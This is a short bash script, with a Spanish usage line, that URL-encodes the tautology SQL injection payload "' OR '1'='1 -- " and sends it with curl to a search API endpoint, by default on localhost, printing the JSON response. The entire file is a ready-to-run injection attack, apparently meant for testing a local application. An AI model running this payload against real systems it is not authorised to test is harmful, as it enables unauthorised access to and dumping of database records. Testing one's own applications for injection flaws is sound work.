#!/usr/bin/env bash
# Uso: ./sqli.sh 'http://localhost:8081/api/search?q='
BASE="${1:-http://localhost:8081/api/search?q=}"
payload="' OR '1'='1 -- "
enc=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload")
curl -s "${BASE}${enc}" | jq . 2>/dev/null || true
